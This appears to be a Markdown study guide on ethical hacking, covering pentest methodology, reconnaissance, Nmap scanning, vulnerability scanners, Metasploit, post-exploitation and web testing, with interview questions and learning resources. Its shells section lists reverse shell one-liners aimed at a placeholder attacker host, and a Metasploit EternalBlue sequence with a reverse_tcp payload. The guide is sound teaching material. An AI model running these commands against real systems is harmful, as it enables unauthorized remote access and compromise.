# 🎯 ETHICAL HACKING - Complete Guide

## Table of Contents
1. [What is Ethical Hacking?](#what-is-ethical-hacking)
2. [Types of Hackers](#types-of-hackers)
3. [Penetration Testing](#penetration-testing)
4. [Reconnaissance](#reconnaissance)
5. [Scanning & Enumeration](#scanning--enumeration)
6. [Vulnerability Assessment](#vulnerability-assessment)
7. [Exploitation Basics](#exploitation-basics)
8. [Post-Exploitation](#post-exploitation)
9. [Web Application Hacking](#web-application-hacking)
10. [Interview Questions](#interview-questions)
11. [Learning Resources](#learning-resources)

---

## What is Ethical Hacking?

### Definition

**Ethical Hacking** (also called Penetration Testing or White Hat Hacking) is the **authorized practice** of testing systems, networks, and applications to find security vulnerabilities before malicious hackers do.

### Key Principles

```
┌─────────────────────────────────────────────────────────────┐
│            ETHICAL HACKING PRINCIPLES                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ✅ AUTHORIZATION                                           │
│     └── Always have written permission (scope document)    │
│                                                             │
│  ✅ SCOPE DEFINITION                                        │
│     └── Know what you can and cannot test                  │
│                                                             │
│  ✅ RESPONSIBLE DISCLOSURE                                  │
│     └── Report vulnerabilities properly                    │
│                                                             │
│  ✅ NON-DESTRUCTIVE                                         │
│     └── Don't cause unnecessary damage                     │
│                                                             │
│  ✅ DOCUMENT EVERYTHING                                     │
│     └── Detailed notes, screenshots, evidence              │
│                                                             │
│  ✅ CONFIDENTIALITY                                         │
│     └── Protect client data and findings                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Legal Considerations

| Document | Purpose |
|----------|---------|
| **NDA** | Non-Disclosure Agreement - protect sensitive info |
| **Rules of Engagement** | What can/cannot be tested |
| **Statement of Work** | Detailed scope and deliverables |
| **Authorization Letter** | Formal permission to test |
| **Liability Waiver** | Protection for tester |

---

## Types of Hackers

### Hacker Categories

```
┌─────────────────────────────────────────────────────────────┐
│                  TYPES OF HACKERS                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ⬜ WHITE HAT (Ethical Hackers)                              │
│     ├── Authorized security professionals                   │
│     ├── Test with permission                               │
│     ├── Improve security                                   │
│     └── Example: Penetration testers, security researchers │
│                                                             │
│  ⬛ BLACK HAT (Malicious Hackers)                            │
│     ├── Unauthorized access                                │
│     ├── Steal data, cause damage                          │
│     ├── Criminal activity                                  │
│     └── Example: Cybercriminals, state-sponsored attackers │
│                                                             │
│  ⬜⬛ GREY HAT                                                │
│     ├── No malicious intent, but without permission        │
│     ├── May disclose vulnerabilities publicly              │
│     └── Ethically questionable                             │
│                                                             │
│  🔴 RED TEAM                                                 │
│     ├── Offensive security team                            │
│     ├── Simulates real attackers                          │
│     └── Tests all aspects including physical, social eng.  │
│                                                             │
│  🔵 BLUE TEAM                                                │
│     ├── Defensive security team                            │
│     ├── Monitors, detects, responds                       │
│     └── SOC analysts, incident responders                 │
│                                                             │
│  🟣 PURPLE TEAM                                              │
│     └── Red + Blue collaboration for improvement          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Penetration Testing

### Types of Penetration Tests

```
┌─────────────────────────────────────────────────────────────┐
│              PENETRATION TEST TYPES                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Based on KNOWLEDGE:                                        │
│  ┌──────────────────┬────────────────────────────────────┐ │
│  │ BLACK BOX        │ No prior knowledge                 │ │
│  │ (External view)  │ Simulates real external attacker   │ │
│  ├──────────────────┼────────────────────────────────────┤ │
│  │ WHITE BOX        │ Full knowledge (source code, arch) │ │
│  │ (Full access)    │ Most thorough, efficient           │ │
│  ├──────────────────┼────────────────────────────────────┤ │
│  │ GREY BOX         │ Partial knowledge                  │ │
│  │ (Limited info)   │ Simulates insider or partner       │ │
│  └──────────────────┴────────────────────────────────────┘ │
│                                                             │
│  Based on TARGET:                                           │
│  ┌──────────────────┬────────────────────────────────────┐ │
│  │ Network Pentest  │ Infrastructure, servers, devices   │ │
│  │ Web App Pentest  │ Websites, APIs                     │ │
│  │ Mobile Pentest   │ iOS, Android applications         │ │
│  │ Wireless Pentest │ WiFi networks                     │ │
│  │ Social Engineering│ Human element                    │ │
│  │ Physical Pentest │ Building security                 │ │
│  │ Red Team Assess. │ Full-scope, all vectors           │ │
│  └──────────────────┴────────────────────────────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Penetration Testing Methodology

```
┌─────────────────────────────────────────────────────────────┐
│             PENTEST METHODOLOGY (PTES)                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. PRE-ENGAGEMENT                                           │
│     └── Scope, goals, authorization, rules                 │
│                      │                                      │
│  2. RECONNAISSANCE  ◄┘                                      │
│     └── Information gathering (OSINT, passive, active)     │
│                      │                                      │
│  3. SCANNING        ◄┘                                      │
│     └── Port scanning, service enumeration                 │
│                      │                                      │
│  4. VULNERABILITY ASSESSMENT ◄┘                             │
│     └── Identify weaknesses                                │
│                      │                                      │
│  5. EXPLOITATION    ◄┘                                      │
│     └── Attempt to gain access                             │
│                      │                                      │
│  6. POST-EXPLOITATION ◄┘                                    │
│     └── Maintain access, pivot, escalate privileges        │
│                      │                                      │
│  7. REPORTING       ◄┘                                      │
│     └── Document findings, recommendations                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Reconnaissance

### What is Reconnaissance?

**Information gathering** about the target before active testing. The more you know, the better your attack strategy.

### Passive Reconnaissance

No direct interaction with target - they won't know you're investigating.

```
┌─────────────────────────────────────────────────────────────┐
│              PASSIVE RECONNAISSANCE                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  OSINT (Open Source Intelligence):                          │
│                                                             │
│  🔍 DOMAIN INFORMATION                                      │
│     ├── WHOIS lookup (domain owner, registrar)             │
│     ├── DNS records (A, MX, NS, TXT)                       │
│     └── Subdomain enumeration                              │
│                                                             │
│  👥 PEOPLE INFORMATION                                      │
│     ├── LinkedIn (employees, job titles)                   │
│     ├── Social media                                       │
│     └── Email addresses (hunter.io, phonebook.cz)         │
│                                                             │
│  🏢 ORGANIZATION INFO                                       │
│     ├── Company website                                    │
│     ├── News articles                                      │
│     ├── Job postings (reveal tech stack)                  │
│     └── SEC filings, public records                       │
│                                                             │
│  🌐 TECHNICAL INFO                                          │
│     ├── Shodan (exposed devices)                          │
│     ├── Censys (certificates, infrastructure)             │
│     ├── Google dorking                                    │
│     ├── Wayback Machine (old website versions)            │
│     └── GitHub repos (leaked credentials, code)           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Google Dorking Examples

```
┌─────────────────────────────────────────────────────────────┐
│                 GOOGLE DORKS                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Find specific file types:                                  │
│  site:example.com filetype:pdf                              │
│  site:example.com filetype:xls password                     │
│                                                             │
│  Find exposed directories:                                  │
│  site:example.com intitle:"index of"                        │
│                                                             │
│  Find login pages:                                          │
│  site:example.com inurl:admin                               │
│  site:example.com intitle:"login"                           │
│                                                             │
│  Find configuration files:                                  │
│  site:example.com filetype:env                              │
│  site:example.com filetype:config                           │
│                                                             │
│  Find exposed databases:                                    │
│  site:example.com filetype:sql                              │
│                                                             │
│  Resource: Google Hacking Database (GHDB)                   │
│  https://www.exploit-db.com/google-hacking-database        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Active Reconnaissance

Direct interaction with target - more information but detectable.

```
┌─────────────────────────────────────────────────────────────┐
│              ACTIVE RECONNAISSANCE                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ⚠️ Can be detected by IDS/IPS and logging                 │
│                                                             │
│  • DNS zone transfers                                      │
│  • Port scanning (Nmap)                                    │
│  • Banner grabbing                                         │
│  • Web spidering/crawling                                 │
│  • Social engineering (phishing, vishing)                 │
│  • Physical location recon                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Scanning & Enumeration

### Port Scanning with Nmap

```
┌─────────────────────────────────────────────────────────────┐
│                 NMAP SCANNING                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  BASIC SCANS:                                               │
│  nmap 192.168.1.1              # Basic scan                │
│  nmap -sS 192.168.1.1          # SYN scan (stealthy)       │
│  nmap -sT 192.168.1.1          # TCP connect scan          │
│  nmap -sU 192.168.1.1          # UDP scan                  │
│  nmap -sV 192.168.1.1          # Version detection         │
│  nmap -O 192.168.1.1           # OS detection              │
│                                                             │
│  COMPREHENSIVE SCAN:                                        │
│  nmap -sC -sV -O -p- 192.168.1.1                           │
│    -sC = default scripts                                   │
│    -sV = version detection                                 │
│    -O  = OS detection                                      │
│    -p- = all 65535 ports                                   │
│                                                             │
│  EVASION TECHNIQUES:                                        │
│  nmap -T1 192.168.1.1          # Slow scan (less detection)│
│  nmap -f 192.168.1.1           # Fragment packets          │
│  nmap -D RND:10 192.168.1.1    # Decoy scan               │
│                                                             │
│  OUTPUT:                                                    │
│  nmap -oN output.txt           # Normal output             │
│  nmap -oX output.xml           # XML output                │
│  nmap -oA output               # All formats               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Port States

| State | Meaning |
|-------|---------|
| **Open** | Port accepting connections |
| **Closed** | Port reachable but no service |
| **Filtered** | Firewall blocking probe |
| **Unfiltered** | Port reachable, unknown if open |

### Service Enumeration

```
┌─────────────────────────────────────────────────────────────┐
│              SERVICE ENUMERATION                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SMB (Port 445):                                            │
│  enum4linux -a 192.168.1.1                                 │
│  smbclient -L //192.168.1.1                                │
│  nmap --script smb-enum* 192.168.1.1                       │
│                                                             │
│  DNS (Port 53):                                             │
│  dig axfr @ns.target.com target.com    # Zone transfer     │
│  dnsrecon -d target.com                                    │
│                                                             │
│  HTTP (Port 80/443):                                        │
│  nikto -h http://target.com            # Web scanner       │
│  gobuster dir -u http://target.com -w wordlist.txt         │
│  dirb http://target.com                                    │
│                                                             │
│  SNMP (Port 161):                                           │
│  snmpwalk -c public -v1 192.168.1.1                        │
│                                                             │
│  LDAP (Port 389):                                           │
│  ldapsearch -x -h 192.168.1.1                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Vulnerability Assessment

### Vulnerability Scanning Tools

```
┌─────────────────────────────────────────────────────────────┐
│            VULNERABILITY SCANNERS                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  COMMERCIAL:                                                │
│  ├── Nessus (most popular)                                 │
│  ├── Qualys                                                │
│  ├── Rapid7 Nexpose/InsightVM                              │
│  └── Burp Suite Pro (web apps)                             │
│                                                             │
│  OPEN SOURCE:                                               │
│  ├── OpenVAS (GVM)                                         │
│  ├── Nikto (web servers)                                   │
│  ├── Nuclei (template-based)                               │
│  └── OWASP ZAP (web apps)                                  │
│                                                             │
│  SPECIALIZED:                                               │
│  ├── SQLMap (SQL injection)                                │
│  ├── WPScan (WordPress)                                    │
│  └── Nmap NSE scripts                                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### CVSS Scoring

```
┌─────────────────────────────────────────────────────────────┐
│        CVSS (Common Vulnerability Scoring System)            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Score Range:                                               │
│  ┌──────────────┬──────────┬───────────────────────────┐   │
│  │ 0.0          │ None     │ No vulnerability          │   │
│  │ 0.1 - 3.9    │ Low      │ Minor impact             │   │
│  │ 4.0 - 6.9    │ Medium   │ Moderate impact          │   │
│  │ 7.0 - 8.9    │ High     │ Significant impact       │   │
│  │ 9.0 - 10.0   │ Critical │ Maximum severity         │   │
│  └──────────────┴──────────┴───────────────────────────┘   │
│                                                             │
│  Factors considered:                                        │
│  • Attack Vector (Network, Adjacent, Local, Physical)      │
│  • Attack Complexity (Low, High)                           │
│  • Privileges Required (None, Low, High)                   │
│  • User Interaction (None, Required)                       │
│  • Impact on CIA (None, Low, High for each)               │
│                                                             │
│  Example: Log4Shell (CVE-2021-44228) = CVSS 10.0          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Exploitation Basics

### Common Exploitation Tools

```
┌─────────────────────────────────────────────────────────────┐
│              EXPLOITATION TOOLS                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  METASPLOIT FRAMEWORK                                       │
│  ├── Most popular exploitation framework                   │
│  ├── Modules: exploits, payloads, auxiliaries              │
│  └── Meterpreter shell                                     │
│                                                             │
│  Basic Metasploit commands:                                 │
│  msfconsole                    # Launch Metasploit         │
│  search eternalblue            # Search for exploits       │
│  use exploit/windows/smb/ms17_010_eternalblue              │
│  set RHOSTS 192.168.1.100      # Target IP                 │
│  set PAYLOAD windows/x64/meterpreter/reverse_tcp           │
│  set LHOST 192.168.1.50        # Your IP                   │
│  exploit                       # Run the exploit           │
│                                                             │
│  OTHER TOOLS:                                               │
│  ├── Cobalt Strike (commercial, red teaming)               │
│  ├── BeEF (browser exploitation)                           │
│  ├── Social Engineering Toolkit (SET)                      │
│  └── Custom scripts/exploits                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Shells and Payloads

```
┌─────────────────────────────────────────────────────────────┐
│              SHELLS & PAYLOADS                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  BIND SHELL:                                                │
│  ┌─────────┐          ┌─────────┐                          │
│  │ Attacker│─────────►│ Victim  │                          │
│  │         │ Connect  │(Listens)│                          │
│  └─────────┘          └─────────┘                          │
│  • Victim opens a port and waits                           │
│  • Attacker connects to that port                          │
│  • Problem: Blocked by firewalls                           │
│                                                             │
│  REVERSE SHELL:                                             │
│  ┌─────────┐          ┌─────────┐                          │
│  │ Attacker│◄─────────│ Victim  │                          │
│  │(Listens)│ Connect  │         │                          │
│  └─────────┘          └─────────┘                          │
│  • Attacker listens on a port                              │
│  • Victim connects back to attacker                        │
│  • Bypasses many firewalls (outbound traffic)              │
│                                                             │
│  COMMON REVERSE SHELL COMMANDS:                             │
│  # Bash                                                    │
│  bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1                │
│                                                             │
│  # Python                                                  │
│  python -c 'import socket,subprocess,os;...'              │
│                                                             │
│  # Netcat                                                  │
│  nc -e /bin/bash ATTACKER_IP PORT                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Post-Exploitation

### Post-Exploitation Activities

```
┌─────────────────────────────────────────────────────────────┐
│              POST-EXPLOITATION                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. MAINTAINING ACCESS                                       │
│     ├── Create backdoor                                    │
│     ├── Add user account                                   │
│     └── Install persistent implant                         │
│                                                             │
│  2. PRIVILEGE ESCALATION                                     │
│     ├── Local exploits                                     │
│     ├── Misconfigurations                                  │
│     ├── Credentials harvesting                             │
│     └── Tools: LinPEAS, WinPEAS, BeRoot                    │
│                                                             │
│  3. CREDENTIAL HARVESTING                                    │
│     ├── Dump hashes (mimikatz, hashdump)                   │
│     ├── Keylogging                                         │
│     ├── Browser credentials                                │
│     └── Config files with passwords                        │
│                                                             │
│  4. LATERAL MOVEMENT                                         │
│     ├── Pass-the-hash                                      │
│     ├── Pass-the-ticket (Kerberos)                         │
│     ├── PSExec, WMI, WinRM                                 │
│     └── SSH with stolen keys                               │
│                                                             │
│  5. DATA EXFILTRATION                                        │
│     ├── Identify valuable data                             │
│     ├── Compress and encrypt                               │
│     └── Exfil via DNS, HTTP, cloud services               │
│                                                             │
│  6. COVERING TRACKS                                          │
│     ├── Clear logs                                         │
│     ├── Remove artifacts                                   │
│     └── Timestomping                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Privilege Escalation

```
┌─────────────────────────────────────────────────────────────┐
│              PRIVILEGE ESCALATION                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  LINUX PRIVESC:                                             │
│  • SUID binaries: find / -perm -4000 2>/dev/null           │
│  • Sudo misconfig: sudo -l                                 │
│  • Writable /etc/passwd or /etc/shadow                     │
│  • Cron jobs running as root                               │
│  • Kernel exploits (Dirty COW, etc.)                       │
│  • Docker breakout                                         │
│                                                             │
│  WINDOWS PRIVESC:                                           │
│  • Unquoted service paths                                  │
│  • DLL hijacking                                           │
│  • AlwaysInstallElevated                                   │
│  • Stored credentials                                      │
│  • Token impersonation (SeImpersonate)                     │
│  • Kernel exploits                                         │
│                                                             │
│  TOOLS:                                                     │
│  • LinPEAS / WinPEAS (automated enumeration)              │
│  • GTFOBins (Linux privilege escalation via binaries)     │
│  • PowerUp (Windows PowerShell)                           │
│  • BeRoot                                                  │
│                                                             │
│  GTFOBins: https://gtfobins.github.io/                     │
│  LOLBAS: https://lolbas-project.github.io/                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Web Application Hacking

### Web Hacking Methodology

```
┌─────────────────────────────────────────────────────────────┐
│            WEB APPLICATION TESTING                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. RECONNAISSANCE                                           │
│     ├── Technology stack (Wappalyzer)                      │
│     ├── Subdomains (amass, subfinder)                      │
│     └── JavaScript analysis                                │
│                                                             │
│  2. DIRECTORY/FILE DISCOVERY                                 │
│     ├── Gobuster, dirb, ffuf                               │
│     ├── robots.txt, sitemap.xml                            │
│     └── Backup files (.bak, .old)                          │
│                                                             │
│  3. VULNERABILITY TESTING                                    │
│     ├── OWASP Top 10 (SQL injection, XSS, etc.)           │
│     ├── Authentication testing                             │
│     ├── Authorization testing                              │
│     └── Business logic flaws                               │
│                                                             │
│  4. EXPLOITATION                                             │
│     ├── SQLMap for SQL injection                           │
│     ├── XSS payload injection                              │
│     └── File upload bypass                                 │
│                                                             │
│  TOOLS:                                                     │
│  • Burp Suite (capture/modify requests)                    │
│  • OWASP ZAP (automated scanning)                          │
│  • SQLMap (SQL injection)                                  │
│  • XSStrike (XSS detection)                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Burp Suite Basics

```
┌─────────────────────────────────────────────────────────────┐
│                 BURP SUITE                                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  KEY COMPONENTS:                                            │
│  ┌──────────────┬──────────────────────────────────────┐   │
│  │ Proxy        │ Intercept and modify traffic         │   │
│  │ Repeater     │ Resend modified requests             │   │
│  │ Intruder     │ Automated attack tool                │   │
│  │ Scanner      │ Vulnerability scanner (Pro)          │   │
│  │ Decoder      │ Encode/decode data                   │   │
│  │ Comparer     │ Compare responses                    │   │
│  └──────────────┴──────────────────────────────────────┘   │
│                                                             │
│  WORKFLOW:                                                  │
│  1. Configure browser to use Burp proxy (127.0.0.1:8080)   │
│  2. Install Burp CA certificate in browser                 │
│  3. Browse application normally                            │
│  4. Analyze captured requests in Proxy > HTTP History      │
│  5. Send interesting requests to Repeater                  │
│  6. Modify and resend to test for vulnerabilities          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Interview Questions

### Basic Questions

**Q1: What is the difference between a vulnerability assessment and penetration testing?**
> "Vulnerability Assessment identifies and classifies vulnerabilities through automated scanning - it's broader but doesn't confirm exploitability. Penetration Testing goes further by actively attempting to exploit vulnerabilities to prove impact and determine real-world risk. VA is like finding unlocked doors; pentesting is actually opening them."

**Q2: What are the phases of a penetration test?**
> "The standard phases are: Pre-engagement (scope, authorization), Reconnaissance (information gathering), Scanning & Enumeration (port scanning, service detection), Vulnerability Assessment (finding weaknesses), Exploitation (gaining access), Post-Exploitation (privilege escalation, lateral movement), and Reporting (documenting findings and recommendations)."

**Q3: What is the difference between a bind shell and reverse shell?**
> "In a bind shell, the victim opens a port and listens for connections from the attacker. In a reverse shell, the attacker listens on a port while the victim connects back to the attacker. Reverse shells are preferred because they bypass most firewalls which typically allow outbound connections."

### Advanced Questions

**Q4: How would you approach testing a web application?**
> "I'd start with reconnaissance - identify technologies, map the application, find all endpoints. Then enumerate directories and files. Next, I'd test each OWASP Top 10 category - injection points, authentication flaws, access control issues, etc. I'd use Burp Suite to intercept and modify requests, test business logic, check API endpoints, and look for misconfigurations. Finally, I'd document everything with reproducible steps."

**Q5: Explain privilege escalation techniques on Linux.**
> "Key techniques include: checking sudo permissions (sudo -l), finding SUID binaries (especially custom ones), exploiting misconfigured cron jobs running as root, checking writable /etc/passwd or /etc/shadow, exploiting services running as root, kernel exploits (if outdated), Docker breakout if in container, and capabilities abuse. Tools like LinPEAS automate enumeration, and GTFOBins lists exploitation methods for common binaries."

---

## Learning Resources

### 📚 Websites

| Website | Link | What You'll Learn |
|---------|------|-------------------|
| **HackTheBox** | https://www.hackthebox.com/ | Real hacking challenges |
| **TryHackMe** | https://tryhackme.com/ | Beginner-friendly labs |
| **PortSwigger Academy** | https://portswigger.net/web-security | Web security |
| **VulnHub** | https://www.vulnhub.com/ | Vulnerable VMs |
| **OWASP** | https://owasp.org/ | Web security standards |
| **PentesterLab** | https://pentesterlab.com/ | Practical exercises |

### 🎥 YouTube Channels

| Channel | Link | Content |
|---------|------|---------|
| **IppSec** | https://www.youtube.com/c/ippsec | HackTheBox walkthroughs |
| **John Hammond** | https://www.youtube.com/c/JohnHammond010 | CTF, malware analysis |
| **NetworkChuck** | https://www.youtube.com/c/NetworkChuck | Hacking tutorials |
| **LiveOverflow** | https://www.youtube.com/c/LiveOverflow | Binary exploitation |
| **TheCyberMentor** | https://www.youtube.com/c/TheCyberMentor | Full courses |
| **HackerSploit** | https://www.youtube.com/c/HackerSploit | Pentesting tutorials |

### 📖 Courses

| Course | Platform | Link |
|--------|----------|------|
| **Practical Ethical Hacking** | TCM Security | https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course |
| **OSCP (PEN-200)** | Offensive Security | https://www.offsec.com/courses/pen-200/ |
| **eJPT** | INE/eLearnSecurity | https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester |
| **Bug Bounty Hunter** | PortSwigger | https://portswigger.net/web-security |

### 🏆 Certifications

| Certification | Focus | Difficulty |
|---------------|-------|------------|
| **eJPT** | Entry-level pentest | Beginner |
| **CEH** | Ethical hacking concepts | Beginner-Mid |
| **OSCP** | Practical pentesting | Intermediate |
| **GPEN** | Network penetration | Intermediate |
| **OSWE** | Web exploitation | Advanced |
| **OSEP** | Enterprise pentesting | Advanced |

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│          ETHICAL HACKING QUICK REFERENCE                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PENTEST PHASES:                                            │
│  Pre-engagement → Recon → Scanning → Vuln Assessment →     │
│  Exploitation → Post-Exploitation → Reporting               │
│                                                             │
│  KEY TOOLS:                                                 │
│  Nmap = Port scanning                                      │
│  Burp Suite = Web app testing                              │
│  Metasploit = Exploitation framework                       │
│  SQLMap = SQL injection                                    │
│  Gobuster = Directory brute forcing                        │
│  LinPEAS/WinPEAS = Privilege escalation                    │
│                                                             │
│  NMAP QUICK:                                                │
│  nmap -sC -sV -O -p- target                                │
│                                                             │
│  SHELL TYPES:                                               │
│  Bind = Victim listens, attacker connects                  │
│  Reverse = Attacker listens, victim connects               │
│                                                             │
│  POST-EXPLOITATION:                                         │
│  Persist → PrivEsc → Credentials → Lateral → Exfil         │
│                                                             │
│  TEST TYPES:                                                │
│  Black Box = No knowledge                                  │
│  Grey Box = Partial knowledge                              │
│  White Box = Full knowledge                                │
│                                                             │
│  REMEMBER: Always have written authorization!              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

*Next Topic: [Security Tools](../07_Security_Tools/01_Security_Tools_Guide.md)*
